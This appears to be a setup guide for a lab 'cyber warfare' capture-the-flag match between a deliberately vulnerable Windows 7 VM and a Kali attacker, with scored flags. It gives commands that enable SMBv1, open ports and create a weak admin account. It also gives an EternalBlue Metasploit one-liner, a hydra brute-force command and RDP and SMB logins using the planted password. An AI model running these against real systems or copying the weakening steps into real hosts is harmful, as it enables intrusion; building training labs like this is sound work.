# 🚀 Quick Start Guide - Cyber Warfare Match

## **🎯 What We've Set Up**

### **✅ Backend Server**
- **Status**: Running on port 5000
- **Database**: MySQL with optimized indexes
- **Automated Scoring**: Enabled
- **ELK Integration**: Configured

### **✅ Match Configuration**
- **Match ID**: 3
- **Name**: Windows 7 Vulnerability Hunt
- **Teams**: RedTeam, BlueTeam
- **Duration**: 60 minutes
- **Flags**: 5 vulnerability flags created

### **✅ VMs Configured**
- **Target VM**: 172.16.26.132 (Windows 7 vulnerable server)
- **Attacker VM**: 172.16.200.136 (Kali Linux)

## **🚀 Next Steps to Complete Setup**

### **Step 1: Set Up Windows 7 Target Server (172.16.26.132)**

1. **Install Windows 7** on a VM with IP `172.16.26.132`
2. **Run these commands as Administrator**:
   ```cmd
   # Enable SMBv1 (MS17-010 vulnerability)
   reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 1 /f
   
   # Enable RDP
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
   
   # Open firewall ports
   netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=TCP localport=445
   netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
   
   # Create test account
   net user admin password123 /add
   net localgroup administrators admin /add
   
   # Create flag files
   mkdir C:\flags
   echo CYBERWAR{eternalblue_ms17_010} > C:\flags\ms17-010.txt
   echo CYBERWAR{smb_v1_enabled} > C:\flags\smb-v1.txt
   ```

### **Step 2: Set Up Kali Linux Attacker (172.16.200.136)**

1. **Install Kali Linux** on a VM with IP `172.16.200.136`
2. **Install tools**:
   ```bash
   sudo apt update && sudo apt install -y metasploit-framework nmap hydra xfreerdp enum4linux
   ```
3. **Test connectivity**:
   ```bash
   ping 172.16.26.132
   nmap -sS -p 445,3389,80 172.16.26.132
   ```

### **Step 3: Start the Match**

1. **Access Admin Dashboard**: http://localhost:3000/admin
2. **Login as admin**: admin@gmail.com / password
3. **Go to Cyberwar Admin Dashboard**
4. **Click "Start Match"** for Match ID 3

### **Step 4: Teams Join and Attack**

1. **Teams access**: http://localhost:3000/cyberwar
2. **Join teams**: RedTeam or BlueTeam
3. **Get assigned to Kali Linux VM**
4. **Start attacking the Windows 7 target**

## **🎯 Expected Vulnerabilities to Find**

### **Flag 1: MS17-010 EternalBlue (200 points)**
- **Command**: `nmap -p 445 --script smb-vuln-ms17-010 172.16.26.132`
- **Exploit**: `msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 172.16.26.132; run"`

### **Flag 2: SMB Version 1 (50 points)**
- **Command**: `nmap -p 445 --script smb-protocols 172.16.26.132`
- **Look for**: SMBv1 enabled

### **Flag 3: Open Ports Discovery (75 points)**
- **Command**: `nmap -sS -p- 172.16.26.132`
- **Expected ports**: 21, 22, 80, 445, 3389

### **Flag 4: Weak Password (150 points)**
- **Command**: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.16.26.132 smb`
- **Password**: `password123`

### **Flag 5: RDP Access (100 points)**
- **Command**: `xfreerdp /v:172.16.26.132 /u:admin /p:password123`
- **Goal**: Successfully connect via RDP

## **📊 Monitoring the Match**

### **Real-time Dashboard**
- **URL**: http://localhost:3000/cyberwar/admin
- **Features**: Live scoring, team progress, flag captures

### **ELK Stack Monitoring**
- **Kibana**: http://172.16.200.136:5601
- **Elasticsearch**: http://172.16.200.136:9200
- **Logstash**: http://172.16.200.136:5044

### **Automated Scoring**
- **Vulnerability Detection**: Every 30 seconds
- **Points Awarded**: Automatically when vulnerabilities found
- **Real-time Updates**: Via WebSocket

## **🔧 Troubleshooting**

### **If Windows 7 target not responding**:
```cmd
# Check if SMB is running
sc query lanmanserver

# Check if ports are open
netstat -an | findstr ":445"
netstat -an | findstr ":3389"
```

### **If Kali Linux can't reach target**:
```bash
# Check network connectivity
ping 172.16.26.132

# Check routing
route -n

# Test specific ports
telnet 172.16.26.132 445
```

### **If automated scoring not working**:
```bash
# Check backend logs
tail -f backend/logs/application-*.log

# Check vulnerability detection service
ps aux | grep vulnerabilityDetection
```

## **🎯 Quick Test Commands**

### **From Kali Linux (172.16.200.136)**:

1. **Basic connectivity**:
   ```bash
   ping -c 4 172.16.26.132
   ```

2. **Port scan**:
   ```bash
   nmap -sS -p 445,3389,80 172.16.26.132
   ```

3. **SMB test**:
   ```bash
   smbclient -L //172.16.26.132 -U admin%password123
   ```

4. **MS17-010 test**:
   ```bash
   nmap -p 445 --script smb-vuln-ms17-010 172.16.26.132
   ```

5. **RDP test**:
   ```bash
   xfreerdp /v:172.16.26.132 /u:admin /p:password123 /cert-ignore
   ```

## **🏆 Scoring System**

- **MS17-010 Exploit**: 200 points
- **SMBv1 Detection**: 50 points
- **Open Ports**: 75 points
- **Weak Password**: 150 points
- **RDP Access**: 100 points
- **Total Possible**: 575 points per team

## **🎉 Ready to Start!**

Once you've completed the Windows 7 and Kali Linux setup:

1. ✅ **Start the match** from admin dashboard
2. ✅ **Teams join** and get VM access
3. ✅ **Automated scoring** begins
4. ✅ **Monitor progress** in real-time
5. ✅ **Teams compete** to find vulnerabilities first

The system will automatically detect when teams successfully exploit vulnerabilities and award points accordingly!

---

**Need help?** Check the detailed setup guides:
- `backend/scripts/setupVulnerableServer.md` - Windows 7 setup
- `backend/scripts/setupKaliAttacker.md` - Kali Linux setup
